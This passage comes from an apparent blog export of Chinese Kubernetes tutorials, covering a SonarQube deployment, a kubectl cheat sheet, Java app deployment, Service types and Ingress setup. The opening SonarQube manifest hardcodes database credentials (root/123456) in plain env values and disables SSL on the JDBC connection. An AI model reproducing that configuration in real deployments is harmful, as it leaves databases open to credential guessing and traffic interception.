class="attr">app:</span> <span class="string">sonarqube</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">sonarqube</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">sonar:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">initContainers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">elasticsearch-logging-init</span></span><br><span class="line">        <span class="attr">image: alpine:</span> <span class="number">3.6</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">/sbin/sysctl</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">-w</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">vm.max_map_count=262144</span></span><br><span class="line">        <span class="attr">resources:</span> &#123;&#125;</span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sonarqube</span></span><br><span class="line">        <span class="attr">image: sonarqube:</span> <span class="number">7.9</span><span class="number">.5</span><span class="string">-community</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">9000</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">SONARQUBE_JDBC_USERNAME</span></span><br><span class="line">          <span class="attr">value:</span> <span class="string">root</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">SONARQUBE_JDBC_PASSWORD</span></span><br><span class="line">          <span class="attr">value:</span> <span class="number">123456</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">SONARQUBE_JDBC_URL</span></span><br><span class="line">          <span class="attr">value:</span> <span class="string">&quot;jdbc: mysql://ip:3306/sonar?useUnicode=true&amp;characterEncoding=utf8&amp;rewriteBatchedStatements=true&amp;useConfigs=maxPerformance&amp;useSSL=false&quot;</span></span><br><span class="line">        <span class="attr">livenessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/sessions/new</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">60</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">30</span></span><br><span class="line">        <span class="attr">readinessProbe:</span></span><br><span class="line">          <span class="attr">httpGet:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/sessions/new</span></span><br><span class="line">            <span class="attr">port:</span> <span class="number">9000</span></span><br><span class="line">          <span class="attr">initialDelaySeconds:</span> <span class="number">60</span></span><br><span class="line">          <span class="attr">periodSeconds:</span> <span class="number">30</span></span><br><span class="line">          <span class="attr">failureThreshold:</span> <span class="number">6</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">limits:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">2000m</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">4096Mi</span></span><br><span class="line">          <span class="attr">requests:</span></span><br><span class="line">            <span class="attr">cpu:</span> <span class="string">300m</span></span><br><span class="line">            <span class="attr">memory:</span> <span class="string">512Mi</span></span><br><span class="line">        <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sonarqube-data</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/opt/sonarqube/data</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">sonarqube-logs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/opt/sonarqube/logs</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">sonarqube</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">jenkins</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">www.sonar.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">serviceName:</span> <span class="string">sonarqube</span></span><br><span class="line">          <span class="attr">servicePort:</span> <span class="number">9000</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes总结一【常用命令】</title>
    <url>/cnblogs.github.io/p/13065.html</url>
    <content><![CDATA[<h3 id="集群信息"><a href="#集群信息" class="headerlink" title="集群信息"></a>集群信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl cluster-info                  # 显示集群信息</span><br><span class="line">kubectl version                       # 显示客户端和服务器版本</span><br><span class="line">kubectl get nodes                     # 查看所有节点状态</span><br><span class="line">kubectl describe node &lt;node-name&gt;     # 查看节点详细信息</span><br></pre></td></tr></table></figure>
<h3 id="资源操作"><a href="#资源操作" class="headerlink" title="资源操作"></a>资源操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get &lt;resource&gt;                # 查看资源(pods, services, deployments等)</span><br><span class="line">kubectl describe &lt;resource&gt; &lt;name&gt;    # 查看资源详细信息</span><br><span class="line">kubectl create -f &lt;file.yaml&gt;         # 通过YAML文件创建资源</span><br><span class="line">kubectl apply -f &lt;file.yaml&gt;          # 应用YAML文件配置</span><br><span class="line">kubectl delete -f &lt;file.yaml&gt;         # 删除YAML文件中定义的资源</span><br><span class="line">kubectl delete &lt;resource&gt; &lt;name&gt;      # 删除指定资源</span><br></pre></td></tr></table></figure>
<h3 id="Pod相关"><a href="#Pod相关" class="headerlink" title="Pod相关"></a>Pod相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get pods                                        # 查看所有pod</span><br><span class="line">kubectl get pods -o wide                                # 查看pod及所在节点</span><br><span class="line">kubectl describe pod &lt;pod-name&gt;                         # 查看pod详细信息</span><br><span class="line">kubectl delete pod &lt;Pod名称&gt;                             # 删除Pod</span><br><span class="line">kubectl delete -f pod.yaml                              # 删除Pod</span><br><span class="line">kubectl logs &lt;pod-name&gt;                                 # 查看pod日志</span><br><span class="line">kubectl logs -f &lt;pod-name&gt;                              # 实时查看pod日志</span><br><span class="line">kubectl logs -c --previous                              # 查看前一个崩溃容器的日志（CrashLoopBackOff 必备）</span><br><span class="line">kubectl logs &lt;pod-name&gt; --tail=200 | grep -i error      # grep/awk/sed 等命令，可以快速筛选异常关键字</span><br><span class="line">kubectl exec -it &lt;pod-name&gt; -- /bin/bash                # 进入pod的shell</span><br><span class="line">kubectl port-forward &lt;pod-name&gt; &lt;local-port&gt;:&lt;pod-port&gt;  # 端口转发</span><br></pre></td></tr></table></figure>
<h3 id="Deployment相关"><a href="#Deployment相关" class="headerlink" title="Deployment相关"></a>Deployment相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get deployments                                     # 查看所有deployment</span><br><span class="line">kubectl describe deployment &lt;deploy-name&gt;                   # 查看deployment详情</span><br><span class="line">kubectl scale deployment &lt;deploy-name&gt; --replicas=&lt;number&gt;  # 扩缩容</span><br><span class="line">kubectl rollout status deployment &lt;deploy-name&gt;             # 查看滚动更新状态</span><br><span class="line">kubectl rollout history deployment &lt;deploy-name&gt;            # 查看部署历史</span><br><span class="line">kubectl rollout undo deployment &lt;deploy-name&gt;               # 回滚到上一版本</span><br></pre></td></tr></table></figure>
<h3 id="Service相关"><a href="#Service相关" class="headerlink" title="Service相关"></a>Service相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get services                                                                # 查看所有service</span><br><span class="line">kubectl describe service &lt;svc-name&gt;                                                 # 查看service详情</span><br><span class="line">kubectl expose deployment &lt;deploy-name&gt; --port=&lt;port&gt; --target-port=&lt;target-port&gt;   # 创建service</span><br></pre></td></tr></table></figure>
<h3 id="命名空间操作"><a href="#命名空间操作" class="headerlink" title="命名空间操作"></a>命名空间操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get namespaces                                      # 查看所有命名空间</span><br><span class="line">kubectl create namespace &lt;ns-name&gt;                          # 创建命名空间</span><br><span class="line">kubectl config set-context --current --namespace=&lt;ns-name&gt;  # 设置默认命名空间</span><br></pre></td></tr></table></figure>
<h3 id="调试命令"><a href="#调试命令" class="headerlink" title="调试命令"></a>调试命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl top nodes                                           # 查看节点资源使用情况</span><br><span class="line">kubectl top pods                                            # 查看pod资源使用情况</span><br><span class="line">kubectl get events                                          # 查看集群事件</span><br><span class="line">kubectl get events --sort-by=&#x27;.metadata.creationTimestamp&#x27;  # 按时间排序查看事件</span><br></pre></td></tr></table></figure>
<h3 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理"></a>配置管理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get configmaps                # 查看configmap</span><br><span class="line">kubectl get secrets                   # 查看secret</span><br><span class="line">kubectl edit &lt;resource&gt; &lt;name&gt;        # 编辑资源</span><br></pre></td></tr></table></figure>
<h3 id="其他实用命令"><a href="#其他实用命令" class="headerlink" title="其他实用命令"></a>其他实用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl api-resources                       # 查看所有API资源类型</span><br><span class="line">kubectl explain &lt;resource&gt;                  # 查看资源定义说明</span><br><span class="line">kubectl cp &lt;pod-name&gt;:&lt;path&gt; &lt;local-path&gt;   # 从pod复制文件到本地</span><br><span class="line">kubectl auth can-i &lt;verb&gt; &lt;resource&gt;        # 检查权限</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes总结二【部署Java应用】</title>
    <url>/cnblogs.github.io/p/44053.html</url>
    <content><![CDATA[<h4 id="第一步：准备阶段"><a href="#第一步：准备阶段" class="headerlink" title="第一步：准备阶段"></a>第一步：准备阶段</h4><p>在开始之前，你需要确保自己的工作环境已经配置好了必要的工具。包括但不限于 Docker（用来打包 Java 应用）、kubectl（Kubernetes 的命令行工具）以及 Helm（一种方便快捷的 K8s 包管理工具）。如果你还不熟悉这些工具的话，别担心，我会尽量用最简单的语言给你解释清楚。假设你已经有了一个简单的 Spring Boot 应用程序。首先要做的是将其容器化。也就是说，我们需要创建一个 Dockerfile 文件来定义这个应用是如何被封装成镜像的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用官方 OpenJDK 镜像作为基础</span><br><span class="line">FROM openjdk:17-jdk-slim</span><br><span class="line"></span><br><span class="line"># 设置工作目录</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># 复制构建好的 JAR 包到镜像内</span><br><span class="line">COPY target/my-awesome-java-app.jar app.jar</span><br><span class="line"></span><br><span class="line"># 暴露端口</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line"># 定义启动命令</span><br><span class="line">CMD [&quot;java&quot;, &quot;-jar&quot;, &quot;app.jar&quot;]</span><br></pre></td></tr></table></figure>
<p>在这个 Dockerfile 中，我们指定了基础镜像、工作目录、复制文件、暴露端口，并设置了容器启动时执行的命令。完成之后，你可以通过执行 docker build -t my-java-app . 来构建镜像。然后使用 docker run 命令验证一下是否能正常运行。</p>
<h4 id="第二步：编写-Deployment-配置文件"><a href="#第二步：编写-Deployment-配置文件" class="headerlink" title="第二步：编写 Deployment 配置文件"></a>第二步：编写 Deployment 配置文件</h4><p>当我们的应用成功被打包成 Docker 镜像后，下一步就是告诉 K8s 如何运行这个应用。这里需要用到 YAML 或 JSON 格式的配置文件。我们先来看一个典型的 Deployment 配置示例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-java-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">my-java-container</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">my-java-app:latest</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>这段配置文件告诉 K8s 我们希望运行三个副本（replicas）的 Java 应用实例，并且这些实例会监听 8080 端口。selector 字段用于匹配 Pod 的标签，而 template 部分则描述了每个 Pod 的具体设置。</p>
<h4 id="第三步：应用配置并检查状态"><a href="#第三步：应用配置并检查状态" class="headerlink" title="第三步：应用配置并检查状态"></a>第三步：应用配置并检查状态</h4><p>现在，有了完整的配置文件后，就可以通过 kubectl apply 命令将其应用到集群中了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f deployment.yaml</span><br></pre></td></tr></table></figure>
<p>接着，我们可以用以下命令来查看 Deployment 和相关的 Pods 是否正确创建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl get deployments</span><br><span class="line">kubectl get pods</span><br></pre></td></tr></table></figure>
<p>如果你看到类似 my-java-deployment-xxx 的 Pods 名称出现，并且它们的状态都是 Running，那么恭喜你，你的 Java 应用已经在 K8s 上顺利部署啦！</p>
<h4 id="第四步：服务暴露与外部访问"><a href="#第四步：服务暴露与外部访问" class="headerlink" title="第四步：服务暴露与外部访问"></a>第四步：服务暴露与外部访问</h4><p>为了让外界能够访问我们的 Java 应用，还需要创建一个 Service 来暴露应用的服务。这里以 LoadBalancer 类型为例：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-java-service</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">LoadBalancer</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-java-app</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>上述配置会创建一个外部可访问的服务，将请求转发给后端的 Java 应用实例。完成后再次应用配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl apply -f service.yaml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes配置详解一【四类Service类型讲解】</title>
    <url>/cnblogs.github.io/p/8882.html</url>
    <content><![CDATA[<p><strong>Service 的四种类型详解</strong></p>
<table>
<thead>
<tr>
<th>类型</th>
<th>是否集群内可用</th>
<th>是否集群外可访问</th>
<th>负载均衡</th>
<th>应用场景</th>
</tr>
</thead>
<tbody><tr>
<td>ClusterIP（默认）</td>
<td>是</td>
<td>否</td>
<td>是</td>
<td>集群内服务通信</td>
</tr>
<tr>
<td>NodePort</td>
<td>是</td>
<td>是（节点IP+端口）</td>
<td>是</td>
<td>集群外简单访问</td>
</tr>
<tr>
<td>LoadBalancer</td>
<td>是</td>
<td>是（分配公网 IP）</td>
<td>是</td>
<td>云服务部署，自动负载均衡</td>
</tr>
<tr>
<td>Headless（无 Cluster IP）</td>
<td>是</td>
<td>否</td>
<td>否</td>
<td>DNS 直连后端 Pod，服务发现灵活</td>
</tr>
</tbody></table>
<h3 id="ClusterIP：集群内默认通信方式"><a href="#ClusterIP：集群内默认通信方式" class="headerlink" title="ClusterIP：集群内默认通信方式"></a>ClusterIP：集群内默认通信方式</h3><p>这是最常用的 Service 类型，也是默认值。它会分配一个 虚拟 IP 和 DNS 名称，用于集群内部通信（比如后端服务之间调用）。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backend</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<ul>
<li>kubectl get svc 可以查看该服务的 ClusterIP。</li>
<li>内部通信可直接使用 DNS 名称 backend.default.svc.cluster.local。</li>
</ul>
<p>✅ 使用场景：服务之间的调用，如 Web -&gt; API -&gt; DB，全部在集群内部。</p>
<h3 id="NodePort：暴露服务到集群外部"><a href="#NodePort：暴露服务到集群外部" class="headerlink" title="NodePort：暴露服务到集群外部"></a>NodePort：暴露服务到集群外部</h3><p>当你希望集群外部访问服务时，可以使用 NodePort 类型。Kubernetes 会在每个节点上分配一个端口（默认范围：30000~32767），将请求转发到对应 Service。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nodeport-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">demo</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8080</span></span><br><span class="line">      <span class="attr">nodePort:</span> <span class="number">30080</span></span><br></pre></td></tr></table></figure>
<p>外部访问方式为：&lt;任意NodeIP&gt;:30080<br>⚠️ 警告：不适合大规模对外服务，缺乏公网 IP 与负载均衡能力。</p>
<h3 id="LoadBalancer：自动申请云负载均衡器"><a href="#LoadBalancer：自动申请云负载均衡器" class="headerlink" title="LoadBalancer：自动申请云负载均衡器"></a>LoadBalancer：自动申请云负载均衡器</h3><p>当你的集群部署在云平台（如 AWS、GCP、阿里云）时，选择 LoadBalancer 类型，Kubernetes 会自动向云服务商申请一个公网 IP，并绑定到负载均衡器。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">lb-demo</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">LoadBalancer</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">demo</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>外部访问方式为：公网 IP:端口</p>
<h3 id="Headless-Service：服务发现更灵活"><a href="#Headless-Service：服务发现更灵活" class="headerlink" title="Headless Service：服务发现更灵活"></a>Headless Service：服务发现更灵活</h3><p>Headless Service 是一种特殊类型，没有 ClusterIP，也不做负载均衡，主要用于将 DNS 直接解析为后端 Pod IP，适合状态服务（如数据库、分布式缓存）。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">headless-db</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">clusterIP:</span> <span class="string">None</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">db</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure>
<p>DNS 查询会返回所有匹配 Pod 的 IP（类似 A 记录数组），而不是虚拟 IP。</p>
<p>典型场景：</p>
<ul>
<li>StatefulSet + Headless Service，构建分布式服务（如 Kafka、Zookeeper）</li>
<li>DNS 控制下的服务发现机制更灵活</li>
</ul>
<p>✅ 总结：四种 Service 类型一句话记住</p>
<ul>
<li>ClusterIP：内部访问首选，默认选项。</li>
<li>NodePort：开发测试简易外部暴露方式。</li>
<li>LoadBalancer：云原生部署首选，自动负载均衡 + 公网 IP。</li>
<li>Headless：Pod 直连、分布式服务构建的基石</li>
</ul>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes配置详解三【Ingress讲解】</title>
    <url>/cnblogs.github.io/p/6068.html</url>
    <content><![CDATA[<h2 id="一、什么是-Ingress？"><a href="#一、什么是-Ingress？" class="headerlink" title="一、什么是 Ingress？"></a>一、什么是 Ingress？</h2><p>Ingress 是一种 Kubernetes API 对象，用于管理集群外部对服务（Service）的 HTTP 和 HTTPS 访问。与传统 NodePort、LoadBalancer 相比，Ingress 更像是一个七层的应用网关。它借助 Ingress Controller，实现对流量的灵活调度，例如：</p>
<ul>
<li>按域名路由（example.com vs api.example.com）</li>
<li>按路径路由（&#x2F;api vs &#x2F;admin）</li>
<li>TLS 终止</li>
<li>支持自定义头部、重定向、中间件等功能（需依赖具体 Controller）</li>
</ul>
<h2 id="二、Ingress-的架构与工作机制"><a href="#二、Ingress-的架构与工作机制" class="headerlink" title="二、Ingress 的架构与工作机制"></a>二、Ingress 的架构与工作机制</h2><p>Ingress 本身只是资源定义，并不具备处理请求的能力。真正转发流量的是 Ingress Controller，它通常是一个运行在集群中的 Pod，比如：</p>
<table>
<thead>
<tr>
<th>控制器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>NGINX Ingress</td>
<td>最主流、社区支持广泛，适合绝大多数场景</td>
</tr>
<tr>
<td>Traefik</td>
<td>动态配置强、与微服务集成紧密，支持中间件功能</td>
</tr>
<tr>
<td>HAProxy Ingress</td>
<td>基于 HAProxy，性能出色</td>
</tr>
<tr>
<td>Istio Gateway</td>
<td>与服务网格场景结合，用于高级路由控制</td>
</tr>
</tbody></table>
<h2 id="三、Ingress-配置实战"><a href="#三、Ingress-配置实战" class="headerlink" title="三、Ingress 配置实战"></a>三、Ingress 配置实战</h2><h3 id="1-基本示例：基于路径的转发"><a href="#1-基本示例：基于路径的转发" class="headerlink" title="1. 基本示例：基于路径的转发"></a>1. 基本示例：基于路径的转发</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">demo-ingress</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class="string">/$2</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/api(/|$)(.*)</span></span><br><span class="line">        <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">api-service</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">80</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/web(/|$)(.*)</span></span><br><span class="line">        <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">web-service</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>说明：<br>    请求 example.com&#x2F;api&#x2F;user 将被转发到 api-service。使用 rewrite-target 重写路径，确保后端能正确解析。pathType 支持 Prefix、Exact、ImplementationSpecific</p>
<h3 id="2-添加-TLS-支持"><a href="#2-添加-TLS-支持" class="headerlink" title="2. 添加 TLS 支持"></a>2. 添加 TLS 支持</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">tls:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hosts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">example.com</span></span><br><span class="line">    <span class="attr">secretName:</span> <span class="string">example-com-tls</span></span><br></pre></td></tr></table></figure>
<p>TLS 证书通常由 Cert-Manager 自动申请、续签，或手动创建 Secret：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create secret tls example-com-tls --cert=cert.pem --key=key.pem</span><br></pre></td></tr></table></figure>
<p>使用 HTTPS 能有效提升安全性，特别是在处理用户数据或提供 API 接口时。</p>
<h3 id="3-多域名支持"><a href="#3-多域名支持" class="headerlink" title="3. 多域名支持"></a>3. 多域名支持</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">app.example.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">app-service</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">80</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">host:</span> <span class="string">blog.example.com</span></span><br><span class="line">    <span class="attr">http:</span></span><br><span class="line">      <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">pathType:</span> <span class="string">Prefix</span></span><br><span class="line">        <span class="attr">backend:</span></span><br><span class="line">          <span class="attr">service:</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">blog-service</span></span><br><span class="line">            <span class="attr">port:</span></span><br><span class="line">              <span class="attr">number:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>这种方式适合将多个服务部署在同一集群中，按域名隔离访问入口。</p>
<h2 id="四、常用-Annotation-说明（以-NGINX-为例）"><a href="#四、常用-Annotation-说明（以-NGINX-为例）" class="headerlink" title="四、常用 Annotation 说明（以 NGINX 为例）"></a>四、常用 Annotation 说明（以 NGINX 为例）</h2><table>
<thead>
<tr>
<th>Annotation</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>rewrite-target</td>
<td>重写路径</td>
</tr>
<tr>
<td>nginx.ingress.kubernetes.io&#x2F;ssl-redirect</td>
<td>是否强制 HTTPS</td>
</tr>
<tr>
<td>nginx.ingress.kubernetes.io&#x2F;backend-protocol</td>
